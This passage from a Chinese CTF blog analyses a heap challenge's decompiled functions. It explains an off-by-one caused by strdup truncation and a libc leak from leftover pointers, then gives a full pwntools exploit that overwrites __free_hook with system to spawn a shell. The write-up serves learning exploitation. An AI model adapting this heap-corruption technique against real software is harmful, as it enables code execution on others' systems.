Passwd_content;</span><br><span class="line">  *(Heap + <span class="number">4</span> * index + <span class="number">3</span>) = Passwd_len;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;add ok...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置用户名称的函数（<code>SetUser</code>）如下，这个函数里允许申请任意大小的chunk，但是往里写入内容时最多只能写入0x100(<code>v5 &lt; 0xFF</code>)的大小，因为输入的中间过渡<code>s[]</code>在栈上，所以<code>s[v5] = 0</code>处实际上没有问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">SetUser</span><span class="params">(<span class="keyword">char</span> **a1, <span class="keyword">unsigned</span> __int64 *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4C4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-4C0h]</span></span><br><span class="line">  <span class="keyword">char</span> *j; <span class="comment">// [rsp+28h] [rbp-4B8h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+30h] [rbp-4B0h]</span></span><br><span class="line">  <span class="keyword">size_t</span> Size; <span class="comment">// [rsp+30h] [rbp-4B0h]</span></span><br><span class="line">  _BYTE *ptr; <span class="comment">// [rsp+38h] [rbp-4A8h]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-4A0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">80</span>]; <span class="comment">// [rsp+80h] [rbp-460h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+D0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+4D8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v10, <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v11, <span class="string">&quot;I&#x27;m going to check every single character, so don&#x27;t try to do anything bad&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new username length: &quot;</span>);</span><br><span class="line">  size = ReadInt(<span class="string">&quot;Please input new username length: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Invalid Length!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new username: &quot;</span>);</span><br><span class="line">  Size = my_read(ptr, size);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; Size &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = v10; j != v11; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ptr[i] == *j &amp;&amp; v5 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = v5++;</span><br><span class="line">        s[v2] = ptr[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  s[v5] = <span class="number">0</span>;</span><br><span class="line">  *a1 = strdup(s);</span><br><span class="line">  *a2 = v5;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置完用户名称后会询问是否要更改某个字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">Change_one</span><span class="params">(__int64 ptr, <span class="keyword">unsigned</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> change; <span class="comment">// [rsp+1Fh] [rbp-B1h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [rsp+20h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 Int; <span class="comment">// [rsp+28h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">64</span>]; <span class="comment">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">80</span>]; <span class="comment">// [rsp+70h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+C8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;I&#x27;m going to check every single character, so don&#x27;t try to do anything bad&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whice character you want to change?&quot;</span>);</span><br><span class="line">  Int = ReadInt();</span><br><span class="line">  <span class="keyword">if</span> ( Int &gt;= size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No! No! No!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input the right char:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%c&quot;</span>, &amp;change);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">for</span> ( i = v6; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid char!!!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *i == change )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(Int + ptr) = change;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是设置密码(<code>SetPasswd</code>)，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">SetPasswd</span><span class="params">(<span class="keyword">char</span> **a1, <span class="keyword">size_t</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+10h] [rbp-430h]</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+18h] [rbp-428h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+438h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new password length: &quot;</span>);</span><br><span class="line">  size = ReadInt();</span><br><span class="line">  <span class="keyword">if</span> ( !size || size &gt; <span class="number">0x400</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Invalid Length!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  s = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new password: &quot;</span>);</span><br><span class="line">  my_read(s, size);</span><br><span class="line">  *a1 = strdup(s);</span><br><span class="line">  *a2 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>delete如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  v1 = ReadInt(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !*(Heap + <span class="number">4</span> * v1) || !*(Heap + <span class="number">4</span> * v1 + <span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;illegal idx!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(*(Heap + <span class="number">4</span> * v1));                       <span class="comment">// Username</span></span><br><span class="line">  <span class="built_in">free</span>(*(Heap + <span class="number">4</span> * v1 + <span class="number">2</span>));                   <span class="comment">// Passwd</span></span><br><span class="line">  <span class="built_in">memset</span>(Heap + <span class="number">32</span> * v1, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;delete ok...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 Int; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  Int = ReadInt();</span><br><span class="line">  <span class="keyword">if</span> ( Int &gt; <span class="number">0xF</span> || !*(Heap + <span class="number">4</span> * Int) || !*(Heap + <span class="number">4</span> * Int + <span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;illegal idx!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;username:&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, *(Heap + <span class="number">4</span> * Int), *(Heap + <span class="number">4</span> * Int + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;password:&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, *(Heap + <span class="number">4</span> * Int + <span class="number">2</span>), *(Heap + <span class="number">4</span> * Int + <span class="number">3</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;show ok...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Break部分"><a href="#Break部分" class="headerlink" title="Break部分"></a>Break部分</h3><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><h5 id="一、off-by-one"><a href="#一、off-by-one" class="headerlink" title="一、off-by-one"></a>一、off-by-one</h5><p>这题的重点在设置Username的函数处，其首先将输入直接写到临时的chunk中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input new username: &quot;</span>);</span><br><span class="line">Size = my_read(ptr, size);</span><br></pre></td></tr></table></figure>

<p>然后通过这种方式来将临时chunk中符合条件的输入写到栈上的数组中，因为v10是用strcpy来写入的，所以v10数组中实际上会包含<code>\x00</code>（或者说v10数组的大小本身就决定了其会包含<code>\x00</code>），也就是说符合条件的输入一共有数字+大小写字符+<code>\x00</code>，这些符合条件的输入会被写到栈上同时会使v5计数增加</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v5 = 0LL;</span></span><br><span class="line"><span class="comment">//  strcpy(v10, &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; Size &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = v10; j != v11; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ptr[i] == *j &amp;&amp; v5 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = v5++;</span><br><span class="line">        s[v2] = ptr[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>重点在最后，其用strdup将s数组中的内容写到了传进的<code>User_content</code>指针中，将计数<code>v5</code>直接写进了传进的<code>User_len</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*a1 = strdup(s);</span><br><span class="line">*a2 = v5;</span><br></pre></td></tr></table></figure>

<p>而strdup函数的定义如下，其是用<code>strlen</code>来确定对象的所需拷贝字节的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *</span></span><br><span class="line"><span class="function"><span class="title">strdup</span><span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(str) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> result ? <span class="built_in">strcpy</span>(result, str) : result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>那么这时候应该也注意到问题了，我们输入的<code>\x00</code>会使计数<code> v5</code>增加，但是在<code>strdup</code>内部其会将<code>str</code>截断使得<code>malloc</code>的大小与<code>v5</code>计数不符，这就会造成在后续修改一个字节用户名称的函数中造成一定范围内的<code>off-by-one</code></p>
<h5 id="二、地址泄漏"><a href="#二、地址泄漏" class="headerlink" title="二、地址泄漏"></a>二、地址泄漏</h5><p>因为在<code>SetUser</code>和<code>SetPasswd</code>中都会申请临时chunk然后再free掉，这就导致在<code>SetUser</code>中被free掉的chunk可以在<code>SetPasswd</code>中被strdup malloc出来，使得passwd中可能有残留的指针，而且Passwd_len是用strlen来计算的，所以会导致残留的指针也被算进里面，在show时就可以被泄漏出来。</p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>用off-by-one可以直接修改chunk的size来造成over lapping（小改大），以前做题时遇到的单字节溢出一般都是off-by-null，所以习惯性地看到单字节溢出就会朝着unlink的那个方向去向，确实如果只有一个off-by-null的话要构造堆重叠往往就要配合unlink来实现向低地址合并，但是如果是off-by-one的话想要构造堆重叠就大可不必用到unlink了。</p>
<p>然后就是堆风水的问题了，堆风水的细节其实不好描述，根据malloc的流程去仔细想想就行，这题其实还是比较值得以后再来复现学习一下的。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,U_size,U_content,P_size,P_content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(U_size))</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(U_content) &lt; U_size:</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;:&quot;</span>,U_content)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendafter(<span class="string">&quot;:&quot;</span>,U_content)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;again?&quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(P_size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,P_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addy</span>(<span class="params">index,U_size,U_content,P_size,P_content,which,change</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(U_size))</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(U_content) &lt; U_size:</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;:&quot;</span>,U_content)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendafter(<span class="string">&quot;:&quot;</span>,U_content)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;again?&quot;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(which))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,change)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(P_size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,P_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *stdrup&#x27;)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x4a0</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span> + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x3e0</span>,<span class="number">0x8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7fc1ff0</span> - <span class="number">0x00007ffff7dd5000</span>)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">og = libc_base + one[<span class="number">0</span>]</span><br><span class="line">addy(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>,<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span> + p64(<span class="number">0x41</span>) + p64(free_hook),<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,p64(system),<span class="number">0x30</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/08/20/pwn%E9%A2%98%E6%9D%BF%E5%AD%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/20/pwn%E9%A2%98%E6%9D%BF%E5%AD%90/" class="post-title-link" itemprop="url">pwn题板子</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-08-20 15:14:15 / 修改时间：15:16:49" itemprop="dateCreated datePublished" datetime="2022-08-20T15:14:15+08:00">2022-08-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>下面这个用的是<code>mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; </code>这个gadget。直接把<code>heap_addr</code>改成payload的起始地址就行</p>
